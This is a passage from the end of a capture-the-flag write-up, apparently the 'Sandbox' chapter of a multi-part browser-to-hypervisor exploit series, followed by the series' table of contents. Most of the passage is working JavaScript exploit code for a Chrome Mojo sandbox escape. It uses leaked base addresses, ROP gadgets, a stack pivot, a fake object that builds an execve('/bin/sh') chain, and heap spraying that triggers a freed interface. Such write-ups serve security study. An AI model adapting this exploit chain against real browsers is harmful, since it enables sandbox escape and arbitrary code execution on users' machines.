  const chrome_base = BigInt(text_leak) - 0x627fc20n;
  print(`Text leak: ${hex(text_leak)}`);
  print(`Chrome base: ${hex(chrome_base)}`);

  const syscall = chrome_base + 0x0972e4b7n; // syscall; ret;
  const move_stack = chrome_base + 0x08ff9a59n; // add rsp, 0x28; ret;
  const pop_rdi = chrome_base + 0x0d8e655bn; // pop rdi; ret
  const pop_rsi = chrome_base + 0x0d8cdf7cn; // pop rsi; ret;
  const pop_rdx = chrome_base + 0x0d86e112n; // pop rdx; ret;
  const pop_rax = chrome_base + 0x0d8e64f4n; // pop rax; ret;

  let boxed_mem = BigInt(heap_leak) + 0x18n;
  let fake_object = new BigUint64Array(0x800 / 8);

  let prog_addr = boxed_mem - 7n + 15n * 8n;

  fake_object.fill(0x4141414141414141n);
  fake_object[0] = 0x68732f6e69622fn; // /bin/sh
  fake_object[1] = prog_addr;
  fake_object[2] = 0n;
  fake_object[5] = chrome_base + 0x0590cc13n; // mov rsp, [rdi]; mov rbp, [rdi+8]; mov dword ptr [rdi+0x20], 0; jmp qword ptr [rdi+0x10];

  fake_object[6] = pop_rdi;
  fake_object[7] = prog_addr;
  fake_object[8] = pop_rsi;
  fake_object[9] = boxed_mem + 8n - 7n;
  fake_object[10] = pop_rdx;
  fake_object[11] = 0n;
  fake_object[12] = pop_rax;
  fake_object[13] = 59n;
  fake_object[14] = syscall;

  fake_object[15] = 0x68632f656d6f682fn; // /home/ch
  fake_object[16] = 0x616c662f656d6f72n; // rome/fla
  fake_object[17] = 0x65746e6972705f67n; // g_printe
  fake_object[18] = 0x72n; // r

  fake.pourSand(new Uint8Array(fake_object.buffer));
  print(`Fake object at: ${hex(boxed_mem)}`);

  await uploadLogs();

  let clients = [];
  for (let i = 0; i < 1000; i++) {
    clients.push(newClient());
  }

  let spray = [];
  for (let i = 0; i < 100; i++) {
    spray.push(newClient());
  }

  let iface = newClient();

  let arg2 = new BigUint64Array(0x1020 / 8);
  arg2[0x800 / 8] = BigInt(boxed_mem) + 1n;
  arg2[0x800 / 8 + 0x818 / 8] = 0n;
  arg2[2 + 0x800 / 8] = move_stack;

  let arg = new Uint8Array(arg2.buffer);

  for (let i = 0; i < clients.length; i++) {
    clients[i].pourSand(arg);
  }

  for (let i = 0; i < 100; i++) {
    iface.pourSand(arg);
    iface.ptr.reset();
    iface = newClient();
  }

  for (let i = 0; i < spray.length; i++) {
    spray[i].pourSand(arg);
  }

  print('done');
}

async function pwn() {
  print('hello world');

  try {
    if (typeof(Mojo) === 'undefined') {
      throw 'no mojo sadge';
    } else {
      print(`Got Mojo!: ${Mojo}`);
      await sbx();
    }
  } catch (e) {
    print(`[-] Exception caught: ${e}`);
    print(e.stack);
  }

  await uploadLogs();
}

pwn();

</script>
</head>
</html>
```

## Table of Contents

- [Prologue](./fourchain-prologue): Introduction
- [Chapter 1: Hole](./fourchain-hole): Using the "hole" to pwn the V8 heap and some delicious Swiss cheese.
- **[Chapter 2: Sandbox](./fourchain-sandbox) (You are here)**
- [Chapter 3: Kernel](./fourchain-kernel): Chaining the Cross-Cache Cred Change
- [Chapter 4: Hypervisor](./fourchain-hv): Lord of the MMIO: A Journey to IEM
- [Chapter 5: One for All](./fourchain-fullchain): Uncheesing a Challenge and GUI Troubles
- [Epilogue](./fourchain-epilogue): Closing thoughts